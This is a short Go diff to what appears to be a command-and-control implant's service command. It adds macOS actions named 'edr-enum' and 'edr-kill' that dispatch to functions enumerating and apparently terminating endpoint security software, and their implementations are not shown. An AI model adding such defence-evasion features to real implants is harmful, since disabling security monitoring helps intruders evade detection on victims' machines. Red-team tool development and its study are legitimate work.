@@ -28,6 +28,7 @@ type serviceArgs struct {
 	BinPath string `json:"binpath"`
 	Display string `json:"display"`
 	Start   string `json:"start"`
+	Confirm string `json:"confirm"`
 }
 
 func (c *ServiceCommand) Execute(task structs.Task) structs.CommandResult {
@@ -60,8 +61,12 @@ func (c *ServiceCommand) Execute(task structs.Task) structs.CommandResult {
 		return serviceDeleteDarwin(args)
 	case "disable":
 		return serviceDisableDarwin(args)
+	case "edr-enum":
+		return serviceEdrEnumDarwin()
+	case "edr-kill":
+		return serviceEdrKillDarwin(args)
 	default:
-		return errorf("Unknown action: %s. Use: list, query, start, stop, restart, create, delete, enable, disable", args.Action)
+		return errorf("Unknown action: %s. Use: list, query, start, stop, restart, create, delete, enable, disable, edr-enum, edr-kill", args.Action)
 	}
 }
 
